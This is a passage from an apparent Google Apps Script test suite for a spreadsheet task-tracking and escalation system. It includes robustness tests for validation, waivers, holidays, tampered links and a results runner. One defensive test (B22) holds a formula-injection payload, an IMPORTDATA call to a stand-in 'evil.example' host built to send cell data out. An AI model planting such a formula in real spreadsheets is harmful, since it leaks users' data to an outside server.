  t.eq(sb.edit(tab, 61, EMP_VIEW.INPUT_COL, 'Some long enough update text here').outcomes[0].code, 'NOT_YOURS', 'Cannot complete another employee\'s task');
  t.eq(sb.cycle('T01-20261116').status, STATUS.OPEN, 'Other employee\'s task untouched');
  t.eq(sb.edit(tab, 62, EMP_VIEW.INPUT_COL, 'PRT-4444').outcomes[0].code, 'NO_ROW', 'Typing on an empty row explains what to do');
}

function test_B09_(sb, t) {
  sb.reset(function (fx) {
    fx.tasks.push(['T02', 'Duplicate id', 'Employee B', 'Every 7 days', 'Ticket ID', '', '18:00', '2026-11-16', true, '']);
    fx.tasks.push(['T06', 'Ghost owner', 'Employee Z', 'Daily', 'Daily Update', '', '18:00', '2026-11-16', true, '']);
    fx.tasks.push(['T07', 'Bad frequency', 'Employee B', 'Every blue moon', 'Ticket ID', '', '18:00', '2026-11-16', true, '']);
    fx.tasks.push(['T08', 'Bad time', 'Employee B', 'Every 7 days', 'Ticket ID', '', '25:99', '2026-11-16', true, '']);
    fx.tasks.push(['T09', 'Bad date', 'Employee B', 'Every 7 days', 'Ticket ID', '', '18:00', '2026-02-31', true, '']);
    fx.tasks.push(['T10', 'Bad proof', 'Employee B', 'Every 7 days', 'Photo', '', '18:00', '2026-11-16', true, '']);
    fx.tasks.push(['T11', 'Very late cut-off', 'Employee B', 'Every 7 days', 'Ticket ID', '', '23:50', '2026-11-20', true, '']);
  }).at('2026-11-16 10:00');
  const res = sb.run();
  t.ok(res.cycles === 6, 'Only the 6 valid tasks produced cycles');
  const health = sb.rows(SHEETS.TASKS).map(function (r) { return String(r[TASK_FIELDS.length - 1]); });
  t.has(health[5], 'Duplicate Task ID', 'Duplicate ID flagged');
  t.has(health[6], 'not on the Team sheet', 'Unknown employee flagged');
  t.has(health[7], 'Frequency', 'Bad frequency flagged');
  t.has(health[8], 'Due Time', 'Bad time flagged');
  t.has(health[9], 'First Due Date', 'Impossible date flagged');
  t.has(health[10], 'Proof Type', 'Unknown proof type flagged');
  t.has(health[11], 'after midnight', 'Cut-off too late for a same-day alert is warned about (task still runs)');
  t.has(health[1], '✅ OK', 'Valid T02 still healthy');
  t.eq(sb.cyclesOf('T02').length, 1, 'Duplicate row did not create a second T02 cycle');
}

function test_B10_(sb, t) {
  sb.reset(function (fx) {
    fx.config.MANAGER_EMAIL = 'not-an-email';
    fx.config.DEFAULT_DUE_TIME = '6pm';
    fx.config.TICKET_ID_PATTERN = '([a-z';
    fx.config.EMAIL_MODE = 'SPAM';
    fx.config.WORKING_DAYS = 'Funday';
    fx.config.RECENT_DAYS = '-3';
    fx.config.SIMULATED_NOW = 'yesterday';
  }).at('2026-11-16 10:00');
  const cfg = sb.ctx().cfg;
  t.ok(cfg.errors.length >= 7, 'All ' + cfg.errors.length + ' bad settings detected');
  t.eq(cfg.defaultDueHM.h, 18, 'Falls back to default cut-off');
  t.eq(cfg.emailMode, 'LOG_ONLY', 'Unknown EMAIL_MODE falls back to safe LOG_ONLY');
  t.eq(cfg.workingDays.size, 6, 'Falls back to default working days');
  sb.run(true);
  t.has(sb.cell(SHEETS.DASHBOARD, 4, TITLE_COL), '⚠️', 'Warnings shown on the dashboard');
  const st = sb.rows(SHEETS.CONFIG).filter(function (r) { return r[0] === 'MANAGER_EMAIL'; })[0];
  t.has(st[3], '⚠️', 'Config Status column flags MANAGER_EMAIL');
  sb.at('2026-11-16 18:31');
  const res = sb.run(true);
  t.eq(sb.mailsOf('MANAGER_ALERT').length, 0, 'No alert can be sent without a manager email…');
  t.ok(res.warnings.some(function (w) { return w.indexOf('No manager email') >= 0; }), '…and that is reported, not crashed');
}

function test_B11_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-16 18:31').run(true);
  const D = SHEETS.DASHBOARD;
  sb.at('2026-11-16 19:00');
  sb.edit(D, sb.rowOf(D, 'T02-20261116'), DASH.NOTE_COL, 'B on sick leave today', 'manager@allo.test');
  const r = sb.edit(D, sb.rowOf(D, 'T02-20261116'), DASH.ACTION_COL, ACTION_WAIVE, 'manager@allo.test');
  t.ok(r.outcomes[0].ok, 'Manager waives the cycle from the dashboard');
  const c = sb.cycle('T02-20261116');
  t.eq(c.status, STATUS.WAIVED, 'Cycle closed as WAIVED');
  t.has(c.closeNote, 'sick leave', 'Reason recorded');
  t.ok(!!c.ackAt, 'Waive counts as acknowledgement');
  t.eq(sb.cycle('T02-20261123').status, STATUS.OPEN, 'Next weekly cycle scheduled');
  sb.at('2026-11-17 18:01').run();
  t.ok(!sb.cycle('T02-20261116').escalatedAt, 'Waived cycle is never escalated');
  sb.run(true);
  const again = sb.edit(D, sb.rowOf(D, 'T02-20261116'), DASH.ACTION_COL, ACTION_WAIVE, 'manager@allo.test');
  t.ok(!again.outcomes[0].ok, 'Waiving an already-closed cycle is refused');
}

function test_B12_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-16 18:10').run(true);
  const D = SHEETS.DASHBOARD;
  const row = sb.rowOf(D, 'T01-20261116');
  t.ok(row > 0, 'Overdue item visible before its alert is due');
  t.ok(sb.edit(D, row, DASH.ACK_COL, true, 'manager@allo.test').outcomes[0].ok, 'Manager acknowledges early');
  sb.at('2026-11-16 18:31').run();
  const alert = sb.mailsOf('MANAGER_ALERT')[0];
  t.ok(alert.cycleIds.indexOf('T01-20261116') < 0 && alert.cycleIds.indexOf('T02-20261116') >= 0, 'Alert skips the acknowledged item, keeps the other');
  t.eq(sb.logCount('ALERT_SKIPPED', 'T01-20261116'), 1, 'Skip logged');
  sb.at('2026-11-17 18:01').run();
  t.has(sb.cycle('T01-20261116').escalationReason, 'still not completed', 'Resolve deadline still enforced');
}

function test_B13_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-16 18:31').run(true);
  const D = SHEETS.DASHBOARD;
  sb.at('2026-11-16 19:00');
  sb.edit(D, sb.rowOf(D, 'T01-20261116'), DASH.ACK_COL, true, 'manager@allo.test');
  sb.at('2026-11-16 19:30');
  const r = sb.edit(D, sb.rowOf(D, 'T01-20261116'), DASH.ACK_COL, false, 'manager@allo.test');
  t.eq(r.outcomes[0].action, 'UNACK', 'Untick detected');
  t.eq(sb.cycle('T01-20261116').ackAt, dt_('2026-11-16 19:00'), 'Original acknowledgement kept');
  t.eq(sb.cell(D, sb.rowOf(D, 'T01-20261116'), DASH.ACK_COL), true, 'Tick restored on the dashboard');
}

function test_B14_(sb, t) {
  sb.reset().at('2026-11-22 09:00').run();
  t.ok(!sb.cycle('T01-20261122'), 'No daily cycle on Sunday');
  const c = sb.cycle('T05-20261122');
  t.eq(c.dueAt, dt_('2026-11-23 18:00'), 'Sunday slot is due Monday');
  sb.at('2026-11-23 10:00');
  t.ok(sb.complete('T05-20261122', 'VR-3001').ok, 'Completed Monday');
  const n = sb.cycle('T05-20261129');
  t.ok(!!n, 'Next slot keeps the Sunday anchor (29 Nov)…');
  t.eq(n.dueAt, dt_('2026-11-30 18:00'), '…and is due the next working day');

  sb.reset(function (fx) { fx.config.HOLIDAYS = '2026-11-17'; }).at('2026-11-16 10:00').run();
  const cfg = sb.ctx().cfg;
  t.eq(ackDeadline_(dt_('2026-11-16 18:30'), cfg), dt_('2026-11-18 11:00'), 'Holiday (Tue 17) skipped by the ack deadline');
  t.eq(resolveDeadline_(dt_('2026-11-16 18:00'), cfg), dt_('2026-11-18 18:00'), 'Holiday skipped by the resolve deadline');
  sb.at('2026-11-17 10:00').run();
  t.ok(!sb.cycle('T01-20261117'), 'No daily task on the holiday');
  sb.at('2026-11-18 10:00').run();
  t.ok(!!sb.cycle('T01-20261118'), 'Daily task resumes after the holiday');
}

function test_B15_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.complete('T02-20261116', 'PRT-1500');
  const n = sb.model().cycles.length;
  sb.ss.deleteSheet(sb.ss.getSheetByName(SHEETS.LOG));
  setupSystem_(sb.ss, { seed: false });
  t.ok(!!sb.ss.getSheetByName(SHEETS.LOG), 'Missing sheet recreated by Setup');
  const m = sb.model();
  t.eq(m.team.length, 4, 'Team rows preserved');
  t.eq(m.tasks.length, 5, 'Task rows preserved');
  t.ok(m.tasks.every(function (x) { return x.active; }), 'Active checkboxes NOT reset by re-running Setup');
  t.eq(m.cycles.length, n, 'Ledger preserved');
  sb.ss.deleteSheet(sb.ss.getSheetByName(SHEETS.CYCLES));
  let msg = '';
  try { sb.run(); } catch (e) { msg = e.message; }
  t.has(msg, 'Setup', 'Missing ledger gives a clear "run Setup" message');
  setupSystem_(sb.ss, { seed: false });
  sb.run();
  t.ok(sb.model().cycles.length > 0, 'System recovers after Setup');
}

function test_B16_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run(true);
  const tabA = employeeTabName_('Employee A');
  sb.ss.deleteSheet(sb.ss.getSheetByName(tabA));
  sb.run(true);
  t.ok(sb.rowOf(tabA, 'T01-20261116') > 0, 'Deleted employee tab is regenerated');
  sb.setTeamField('Employee D', 'Active', false);
  sb.run(true);
  t.ok(!sb.ss.getSheetByName(employeeTabName_('Employee D')), 'Tab removed for an inactive employee');
  t.has(sb.cell(SHEETS.TASKS, sb.rowOf(SHEETS.TASKS, 'T04'), TASK_FIELDS.length), 'inactive', 'Their task is flagged for reassignment');
}

function test_B17_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  const sh = sb.ss.getSheetByName(SHEETS.CYCLES);
  const copy = sh.getRange(sb.rowOf(SHEETS.CYCLES, 'T02-20261116'), 1, 1, CYCLE_FIELDS.length).getValues()[0];
  const broken = copy.map(function () { return ''; });
  broken[0] = 'BROKEN-1'; broken[1] = 'T02'; broken[9] = 'WHATEVER';
  appendRows_(sh, [broken, copy], CYCLE_FIELDS.length);
  const res = sb.run();
  t.ok(res.warnings.some(function (w) { return w.indexOf('kept but ignored') >= 0; }), 'Corrupt / duplicate rows reported');
  t.ok(sb.rowOf(SHEETS.CYCLES, 'BROKEN-1') > 0, 'Corrupt row preserved verbatim (never silently deleted)');
  t.eq(sb.cyclesOf('T02').length, 1, 'Duplicate row not double-counted');
  sb.at('2026-11-16 18:31').run();
  t.eq(sb.mailsOf('MANAGER_ALERT')[0].cycleIds.filter(function (x) { return x === 'T02-20261116'; }).length, 1, 'Duplicate row does not cause a duplicate alert line');
}

function test_B18_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  t.eq(sb.complete('T01-20261116', new Array(6002).join('x')).code, 'TOO_LONG', '6000-character paste rejected');
  t.eq(sb.complete('T01-20261116', '                         ').code, 'EMPTY', 'Whitespace-only rejected');
  t.ok(sb.complete('T01-20261116', 'Ops 16 Nov: normal day, 38 orders, no incidents.').ok, 'Real update accepted');
}

function test_B19_(sb, t) {
  sb.reset().at('2026-11-16 10:00');
  sb.setTeamField('Employee B', 'Email', '');
  sb.run();
  sb.at('2026-11-16 16:00');
  const res = sb.run();
  t.ok(res.warnings.some(function (w) { return w.indexOf('Employee B has no email') >= 0; }), 'Missing employee email reported (no crash)');
  sb.at('2026-11-16 18:31');
  sb.failMail = true;
  sb.run();
  t.ok(!sb.cycle('T01-20261116').alertAt, 'Failed alert is not stamped');
  t.ok(sb.logCount('EMAIL_FAILED', 'T01-20261116') >= 1, 'Failure logged');
  sb.failMail = false;
  sb.at('2026-11-16 18:46').run();
  sb.run();
  t.eq(sb.mailsOf('MANAGER_ALERT').length, 1, 'Delivered exactly once after recovery');
}

function test_B20_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-16 18:31').run();
  const sigA = signId_('T01-20261116');
  t.has(doGetCore_(sb.ctx(), { a: 'ack', c: 'T02-20261116', s: sigA }).html, 'not valid', 'Swapped Cycle ID rejected');
  t.has(doGetCore_(sb.ctx(), { a: 'ack', c: 'T01-20261116', s: '' }).html, 'not valid', 'Missing signature rejected');
  t.has(doGetCore_(sb.ctx(), {}).html, 'Nothing to do', 'Bare URL is harmless');
  t.has(doGetCore_(sb.ctx(), { a: 'ack', c: 'NOPE-1', s: signId_('NOPE-1') }).html, 'not found', 'Signed but unknown ID handled');
  t.ok(!confirmAckCore_(sb.ctx(), 'T01-20261116', sigA + 'A', '').ok, 'Tampered signature rejected on confirm');
  t.ok(!sb.cycle('T01-20261116').ackAt, 'Nothing was acknowledged by any of the above');
  const url = ackUrl_(sb.ctx(), sb.model(), 'T01-20261116');
  t.has(url, 'a=ack&c=T01-20261116&s=', 'Real acknowledgement links are signed');
}

function test_B21_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run(true);
  const tab = employeeTabName_('Employee A');
  const row = sb.rowOf(tab, 'T01-20261116');
  // The user typed, but the 15-minute refresh redrew the tab before the edit was processed: the cell is empty now.
  const range = sb.ss.getSheetByName(tab).getRange(row, EMP_VIEW.INPUT_COL);
  const res = handleEditCore_(sb.ctx(), { range: range, source: sb.ss, value: 'Ops update typed during a refresh, 40 orders.' });
  t.eq(res.outcomes[0].code, 'REFRESHED', 'Detected that the sheet changed under the user');
  t.eq(sb.cycle('T01-20261116').status, STATUS.OPEN, 'Nothing was applied to a possibly different row');
  t.has(res.outcomes[0].msg, 'again', 'User is asked to re-enter (entry not silently lost)');
}

function test_B22_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run(true);
  const evil = '=IMPORTDATA("https://evil.example/steal?d="&A1) ops update text';
  const tab = employeeTabName_('Employee A');
  const r = sb.edit(tab, sb.rowOf(tab, 'T01-20261116'), EMP_VIEW.INPUT_COL, evil, 'a@allo.test');
  t.ok(r.outcomes[0].ok, 'Text starting with "=" is accepted as plain text');
  sb.run(true);
  const D = SHEETS.DASHBOARD;
  const dRow = sb.rowOf(D, 'T01-20261116');
  t.eq(sb.cell(D, dRow, DASH.RECENT_PROOF_COL), evil, 'Dashboard shows the text verbatim');
  t.eq(sb.formula(D, dRow, DASH.RECENT_PROOF_COL), '', 'Dashboard does NOT evaluate it as a formula');
  const eRow = sb.rowOf(tab, 'T01-20261116');
  t.eq(sb.cell(tab, eRow, 6), evil, 'Employee tab shows it verbatim');
  t.eq(sb.formula(tab, eRow, 6), '', 'Employee tab does NOT evaluate it as a formula');
  t.eq(sb.formula(SHEETS.CYCLES, sb.rowOf(SHEETS.CYCLES, 'T01-20261116'), 13), '', 'Ledger stores it as text');
  t.has(sb.formula(tab, eRow, 5), 'HYPERLINK', 'Our own share link is still a working formula');
  t.eq(sb.complete('T02-20261116', '=1+1').code, 'BAD_TICKET', 'Formula-looking ticket rejected');
}

/* ───────────── runner ───────────── */

function testCases_() {
  return [
    { id: 'T1', group: 'core', name: 'Recurring cycle: completing a 7/15/30-day task closes it and schedules the next', fn: test_T1_ },
    { id: 'T2', group: 'core', name: 'Single-point completion from the employee\'s own tab', fn: test_T2_ },
    { id: 'T3', group: 'core', name: 'Daily task (WhatsApp update) completion method', fn: test_T3_ },
    { id: 'T4', group: 'core', name: 'Same-day manager alert (and pre-cut-off reminder)', fn: test_T4_ },
    { id: 'T5', group: 'core', name: 'Manager acknowledgement + later completion tracked', fn: test_T5_ },
    { id: 'T6', group: 'core', name: 'Leadership escalation (no ack / still not done) + resolved notice', fn: test_T6_ },
    { id: 'T7', group: 'core', name: 'Escalation timing / SLA maths incl. weekends', fn: test_T7_ },
    { id: 'T8', group: 'core', name: 'No duplicate cycles, completions or emails (incl. mail outage)', fn: test_T8_ },
    { id: 'B01', group: 'break', name: 'Junk ticket IDs rejected', fn: test_B01_ },
    { id: 'B02', group: 'break', name: 'Re-used ticket IDs rejected', fn: test_B02_ },
    { id: 'B03', group: 'break', name: 'Closing a future period early is blocked', fn: test_B03_ },
    { id: 'B04', group: 'break', name: 'Very late completion: skipped slot recorded, schedule kept', fn: test_B04_ },
    { id: 'B05', group: 'break', name: 'Deactivate / reactivate task', fn: test_B05_ },
    { id: 'B06', group: 'break', name: 'Reassign task to another employee', fn: test_B06_ },
    { id: 'B07', group: 'break', name: 'Multi-row paste and edits in the wrong place', fn: test_B07_ },
    { id: 'B08', group: 'break', name: 'Stale row, unknown ID, someone else\'s task, empty row', fn: test_B08_ },
    { id: 'B09', group: 'break', name: 'Invalid Task Master rows are flagged, valid ones unaffected', fn: test_B09_ },
    { id: 'B10', group: 'break', name: 'Broken configuration falls back safely', fn: test_B10_ },
    { id: 'B11', group: 'break', name: 'Manager waives a cycle (leave/holiday)', fn: test_B11_ },
    { id: 'B12', group: 'break', name: 'Acknowledging before the alert suppresses it', fn: test_B12_ },
    { id: 'B13', group: 'break', name: 'Unticking an acknowledgement is ignored', fn: test_B13_ },
    { id: 'B14', group: 'break', name: 'Weekend handling for daily and interval tasks', fn: test_B14_ },
    { id: 'B15', group: 'break', name: 'Setup re-run preserves data; missing sheets recoverable', fn: test_B15_ },
    { id: 'B16', group: 'break', name: 'Deleted / inactive employee tabs', fn: test_B16_ },
    { id: 'B17', group: 'break', name: 'Corrupted ledger rows are preserved and ignored', fn: test_B17_ },
    { id: 'B18', group: 'break', name: 'Daily update abuse (huge, blank)', fn: test_B18_ },
    { id: 'B19', group: 'break', name: 'Missing employee email and mail outage', fn: test_B19_ },
    { id: 'B20', group: 'break', name: 'Acknowledgement link tampering', fn: test_B20_ },
    { id: 'B21', group: 'break', name: 'Sheet refreshed while the employee was typing', fn: test_B21_ },
    { id: 'B22', group: 'break', name: 'Formula injection through proof text', fn: test_B22_ },
  ];
}

/*
 * Google stops any single script run after 6 minutes, and in a real spreadsheet each test takes
 * ~30 s (sheet creation, protection, rendering). So the menu runs the suite in parts of at most
 * 8 tests, and every run merges its results into one Test Results sheet that always lists all tests.
 */
function testParts_() {
  return [
    { key: 'core', label: 'Run core tests (T1–T8)', fn: 'menuTestsCore', from: 'T1', to: 'T8' },
    { key: 'break1', label: 'Run robustness tests 1/4 (B01–B06)', fn: 'menuTestsBreak1', from: 'B01', to: 'B06' },
    { key: 'break2', label: 'Run robustness tests 2/4 (B07–B12)', fn: 'menuTestsBreak2', from: 'B07', to: 'B12' },
    { key: 'break3', label: 'Run robustness tests 3/4 (B13–B17)', fn: 'menuTestsBreak3', from: 'B13', to: 'B17' },
    { key: 'break4', label: 'Run robustness tests 4/4 (B18–B22)', fn: 'menuTestsBreak4', from: 'B18', to: 'B22' },
  ];
}

function testSandboxName_() { return 'Allo Tasks — test sandbox (auto-deleted)'; }

/** IDs are zero-padded within a prefix, so a string range is exact. */
function testsInPart_(key) {
  if (key === 'all') return testCases_();
  const part = testParts_().filter(function (p) { return p.key === key; })[0];
  if (!part) throw new Error('Unknown test part ' + key);
  return testCases_().filter(function (tc) {
    return tc.id.charAt(0) === part.from.charAt(0) && tc.id.length === part.from.length &&
      tc.id >= part.from && tc.id <= part.to;
  });
}

function partOfTest_(id) {
  return testParts_().filter(function (p) {
    return testsInPart_(p.key).some(function (tc) { return tc.id === id; });
  })[0];
}

/** Runs one part ('core', 'break1'…, or 'all') on a sandbox spreadsheet. */
function runTestSuiteCore_(sandboxSs, part, budgetMs) {
  const sb = makeSandbox_(sandboxSs);
  const started = Date.now();
  const results = [];
  testsInPart_(part || 'all').forEach(function (tc) {
    if (budgetMs && Date.now() - started > budgetMs) {
      results.push({ id: tc.id, name: tc.name, result: 'NOT RUN', ms: 0,
        evidence: 'Stopped before this test to stay inside Google’s 6-minute limit. Run this part again.' });
      return;
    }
    const kit = testKit_();
    const t0 = Date.now();
    try {
      tc.fn(sb, kit);
      results.push({ id: tc.id, name: tc.name, result: 'PASS', evidence: kit.notes.join('\n'), ms: Date.now() - t0 });
    } catch (err) {
      const why = err && err.stack ? String(err.stack).split('\n').slice(0, 4).join('\n') : String(err);
      results.push({ id: tc.id, name: tc.name, result: 'FAIL', evidence: kit.notes.concat(['✘ ' + why]).join('\n'), ms: Date.now() - t0 });
    }
  });
  return results;
}

/** Merges this run's results into the sheet: one row per test, in suite order. Returns every row. */
function writeTestResults_(host, results) {
  const sh = host.getSheetByName(SHEETS.TESTS) || ensureTableSheet_(host, SHEETS.TESTS, TEST_HEADERS);
  const prev = {};
  if (sh.getLastRow() > 1) {
    sh.getRange(2, 1, sh.getLastRow() - 1, TEST_HEADERS.length).getValues().forEach(function (r) { prev[String(r[0])] = r; });
  }
  const ranAt = new Date();
  const fresh = {};
  results.forEach(function (r) { fresh[r.id] = [r.id, r.name, r.result, truncate_(r.evidence, 45000), r.ms, ranAt]; });
  const rows = testCases_().map(function (tc) {
    if (fresh[tc.id]) return fresh[tc.id];
    const old = prev[tc.id];
    if (old && old[2] !== 'NOT RUN') return [tc.id, tc.name, old[2], old[3], old[4], old[5]];
    return [tc.id, tc.name, 'NOT RUN', 'Not run yet: ⚙️ Task System → 🧪 Automated tests → ' + partOfTest_(tc.id).label + '.', '', ''];
  });
  clearDataRows_(sh);
  appendRows_(sh, rows, TEST_HEADERS.length);
  sh.getRange(2, 3, rows.length, 1).setBackgrounds(rows.map(function (r) {
    return [r[2] === 'PASS' ? COLORS.OK_BG : (r[2] === 'FAIL' ? COLORS.BAD_BG : COLORS.WARN_BG)];
  }));
  sh.getRange(2, 1, rows.length, TEST_HEADERS.length).setVerticalAlignment('top');
  sh.getRange(2, 4, rows.length, 1).setWrap(true);
  return rows;
}

/** A run Google kills at 6 minutes never reaches its clean-up, so each run also bins earlier leftovers. */
function trashTestSandboxes_() {
  try {
    const files = DriveApp.getFilesByName(testSandboxName_());
    while (files.hasNext()) files.next().setTrashed(true);
  } catch (e) { /* clean-up is best effort */ }
}

function runTestsToSheet_(part) {
  const host = SpreadsheetApp.getActiveSpreadsheet();
  trashTestSandboxes_();
  const sandbox = SpreadsheetApp.create(testSandboxName_());
  let results;
  try {
    results = runTestSuiteCore_(sandbox, part, 240000);
  } finally {
    try { DriveApp.getFileById(sandbox.getId()).setTrashed(true); } catch (e) { /* sandbox clean-up is best effort */ }
  }
  const rows = writeTestResults_(host, results);
  host.setActiveSheet(host.getSheetByName(SHEETS.TESTS));
  const passed = function (list, pick) { return list.filter(function (r) { return pick(r) === 'PASS'; }).length; };
  const notRun = rows.filter(function (r) { return r[2] === 'NOT RUN'; }).length;
  alert_('This part: ' + passed(results, function (r) { return r.result; }) + ' / ' + results.length + ' passed.\n' +
    'Whole suite so far: ' + passed(rows, function (r) { return r[2]; }) + ' / ' + rows.length + ' passed' +
    (notRun ? ', ' + notRun + ' not run yet.' : '.') + '\nDetails and evidence are in the "' + SHEETS.TESTS + '" sheet.');
  return results;
}
